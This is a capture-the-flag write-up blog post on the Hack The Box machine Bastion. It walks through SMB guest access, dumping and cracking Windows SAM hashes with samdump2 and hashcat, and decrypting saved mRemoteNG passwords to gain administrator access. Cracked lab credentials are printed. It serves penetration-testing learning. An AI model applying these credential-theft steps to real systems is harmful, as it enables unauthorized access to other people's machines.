<!doctype html><html lang=en><head><title>Hack The Box: Bastion :: ikuamike</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=keywords content=","><meta name=robots content="noodp"><link rel=canonical href=https://blog.ikuamike.io/posts/2019/bastion-htb/><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-202973704-2','auto'),ga('send','pageview'))</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-202973704-2','auto'),ga('send','pageview'))</script><script async src=https://www.google-analytics.com/analytics.js></script><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://blog.ikuamike.io/img/bastion/info_card.png"><meta name=twitter:title content="Hack The Box: Bastion"><meta name=twitter:description content><meta name=twitter:site content="@ikuamike"><link rel=stylesheet href=https://blog.ikuamike.io/styles.css><link rel=stylesheet href=https://blog.ikuamike.io/style.css><link rel="shortcut icon" href=https://blog.ikuamike.io/img/theme-colors/green.png><link rel=apple-touch-icon href=https://blog.ikuamike.io/img/theme-colors/green.png><meta name=twitter:card content="summary_large_image"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Hack The Box: Bastion"><meta property="og:description" content><meta property="og:url" content="https://blog.ikuamike.io/posts/2019/bastion-htb/"><meta property="og:site_name" content="ikuamike"><meta property="og:image" content="https://blog.ikuamike.io/"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2019-09-06 00:00:00 +0000 UTC"></head><body class=green><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>> cd ~</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;‚ñæ</li><li><ul class=menu__dropdown><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li><li><a href=/webinars>Webinars</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li><li><ul class=menu><li class=menu__trigger>Show more&nbsp;‚ñæ</li><li><ul class=menu__dropdown><li><a href=/webinars>Webinars</a></li></ul></li></ul></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://blog.ikuamike.io/posts/2019/bastion-htb/>Hack The Box: Bastion</a></h1><div class=post-meta><time class=post-date>2019-09-06 ::</time></div><span class=post-tags>#<a href=https://blog.ikuamike.io/tags/htb/>HTB</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/smb/>SMB</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/sam/>SAM</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/john/>John</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/mremoteng/>mRemoteNG</a>&nbsp;</span><div class=post-content><div><img src=/img/bastion/info_card.png alt="Bastion Info Card" class=center style=border-radius:8px><h1 id=summary>Summary<a href=#summary class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Bastion was a relatively easy box. There is an smb share is accessible without credentials and inside there is a backup drive that we can mount and access. From the drive we can dump the SAM file and crack it to get login credentials. Once logged in we find mRemoteNG installed and extract its saved passwords to get admin access.</p><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>&#8983;</a></h1><p>I start with this nmap command to quickly find open ports.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>nmap -sS -p- --min-rate<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span> 10.10.10.134

Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.134
Host is up <span style=color:#f92672>(</span>0.23s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>65522</span> closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
</code></pre></div><p>Then run a thorough service scan on the discovered ports.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>nmap -sC -sV -p 22,135,139,445,5985,47001 -oA nmap/bastion 10.10.10.134

Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.134
Host is up <span style=color:#f92672>(</span>0.22s latency<span style=color:#f92672>)</span>.

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey:
|   <span style=color:#ae81ff>2048</span> 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> cc:2e:56üÜé19:97:d5:bb:03:fb:82üíø63:da:68:01 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server <span style=color:#ae81ff>2016</span> Standard <span style=color:#ae81ff>14393</span> microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span style=color:#f92672>(</span>SSDP/UPnP<span style=color:#f92672>)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style=color:#f92672>(</span>SSDP/UPnP<span style=color:#f92672>)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server <span style=color:#ae81ff>2008</span> R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -42m39s, deviation: 1h09m15s, median: -2m40s
| smb-os-discovery:
|   OS: Windows Server <span style=color:#ae81ff>2016</span> Standard <span style=color:#ae81ff>14393</span> <span style=color:#f92672>(</span>Windows Server <span style=color:#ae81ff>2016</span> Standard 6.3<span style=color:#f92672>)</span>
|   Computer name: Bastion
|   NetBIOS computer name: BASTION<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
|   Workgroup: WORKGROUP<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
|_  System time: 2019-09-06T13:28:45+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span style=color:#f92672>(</span>dangerous, but default<span style=color:#f92672>)</span>
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-09-06 12:28:49
|_  start_date: 2019-09-06 11:58:13

</code></pre></div><h2 id=smb>SMB<a href=#smb class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Based on the open ports the best service to check out first is smb.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>smbmap -H 10.10.10.134 -u <span style=color:#e6db74>&#39; &#39;</span>

<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Finding open SMB ports....
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Guest SMB session established on 10.10.10.134...
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> IP: 10.10.10.134:445        Name: 10.10.10.134
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS
        IPC$                                                    READ ONLY
</code></pre></div><p>After running smbmap, I discover a share called Backups that I have read and write permissions as a guest user.</p><p>Since this is a windows machine I will switch to my windows vm to make my work easier.</p><img src=/img/bastion/backup_share.png alt="backup share" class=center style=border-radius:8px><p>Contents of note.txt</p><p><em>Sysadmins: please don&rsquo;t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.</em></p><p>Going deeper into the WindowsImageBackup folder I found a backup image which is quite big. Downloading the whole file would not be an option as the note.txt suggested. Fortunately I can mount it through the share remotely, this is the reason why I wanted to use a windows vm.</p><img src=/img/bastion/backup_share_2.png alt="backup share" class=center style=border-radius:8px><p>On mounting it, it appears as Local Disk (D:). After accessing the home directory of user L4mpje and looking through the folders there was no user.txt, it must have been excluded from the backup.</p><img src=/img/bastion/backup_share_3.png alt="backup share" class=center style=border-radius:8px><p>At this stage I was stuck for a while (I still suck at owning windows) and after some hints in the forum I figured I should look at where credentials are stored locally on windows and how to get them. Simply the equivalent of /etc/shadow or /etc/passwd on linux.</p><p>I learnt that I should be looking in C:\windows\system32\config for the SAM and SYSTEM files which I found.</p><img src=/img/bastion/backup_share_4.png alt="backup share" class=center style=border-radius:8px><h5 id=now-to-get-the-credentials>Now to get the credentials!<a href=#now-to-get-the-credentials class=hanchor arialabel=Anchor>&#8983;</a></h5><p>I pulled the 2 files back to my kali box and using samdump2 I got the user hash.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>samdump2 SYSTEM SAM

*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
</code></pre></div><p>I then cracked the NTLM hash for L4mpje using hashcat and got the password.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>hashcat -m <span style=color:#ae81ff>1000</span> -a <span style=color:#ae81ff>0</span> 26112010952d963c8dc4217daec986d9 /usr/share/wordlists/rockyou.txt --force

26112010952d963c8dc4217daec986d9:bureaulampje
</code></pre></div><h1 id=exploitation>Exploitation<a href=#exploitation class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Now that I have a username and password I can login through ssh.</p><img src=/img/bastion/bastion_5.png alt="backup share" class=center style=border-radius:8px><p>Now that user is owned, let&rsquo;s try to escalate privileges to admin.</p><p>I switched to powershell and started looking at installed programs. mRemoteNG isn&rsquo;t a default windows application so let me look into it and if it can help in privesc.</p><img src=/img/bastion/bastion_6.png alt="backup share" class=center style=border-radius:8px><p>According to their website:</p><p><em>mRemoteNG is a fork of mRemote: an open source, tabbed, multi-protocol, remote connections manager.</em></p><p>I found a metasploit module that claims to extract saved passwords from mRemoteNG. Since I am logged in I don&rsquo;t need metasploit so I looked at the source to see how it extracts the passwords and decrypts them.</p><p>The saved passwords are located in AppData in mRemoteNG\confCons.xml. Once I found the file the admin password was there but encrypted.</p><img src=/img/bastion/bastion_7.png alt="backup share" class=center style=border-radius:8px><p>I was able to find a script on github to decrypt the password.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>./mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw<span style=color:#f92672>==</span>

Password: thXLHM96BeKL0ER2
</code></pre></div><p>I can finally login as administrator and own system!</p><img src=/img/bastion/bastion_8.png alt="backup share" class=center style=border-radius:8px><h1 id=references>References<a href=#references class=hanchor arialabel=Anchor>&#8983;</a></h1><ul><li><a href=https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py target=_blank rel=noopener>mremoteng_decrypt.py</a></li><li><a href=https://vulners.com/metasploit/MSF:POST/WINDOWS/GATHER/CREDENTIALS/MREMOTE/ target=_blank rel=noopener>mremote metasploit module</a></li></ul></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://blog.ikuamike.io/posts/2020/bitlab-htb/><span class=button__icon>‚Üê</span>
<span class=button__text>Hack The Box: Bitlab</span></a></span></div></div></article></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>¬© Michael Ikua</span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div><script src=https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js></script><script>addBackToTop({diameter:40,backgroundColor:'rgb(120, 226, 160)',textColor:'#1F222A',cornerOffset:30})</script><script src=https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js></script><script>particlesJS("particles-js",{particles:{number:{value:60,density:{enable:!0,value_area:1e3}},color:{value:"#ffffff"},shape:{type:"circle",stroke:{width:0,color:"#000000"}},opacity:{value:.5,random:!1,anim:{enable:!1,speed:1,opacity_min:.1,sync:!1}},size:{value:2,random:!0,anim:{enable:!1,speed:4,size_min:.1,sync:!1}},line_linked:{enable:!0,distance:150,color:"#ffffff",opacity:.4,width:1},move:{enable:!0,speed:.5,direction:"none",random:!1,straight:!1,out_mode:"out",bounce:!1,attract:{enable:!1,rotateX:600,rotateY:1200}}},interactivity:{detect_on:"canvas",events:{onhover:{enable:!1,mode:"grab"},onclick:{enable:!1,mode:"push"},resize:!0},modes:{grab:{distance:140,line_linked:{opacity:1}},bubble:{distance:400,size:40,duration:2,opacity:8,speed:3},repulse:{distance:200,duration:.4},push:{particles_nb:4},remove:{particles_nb:2}}},retina_detect:!0})</script></body></html>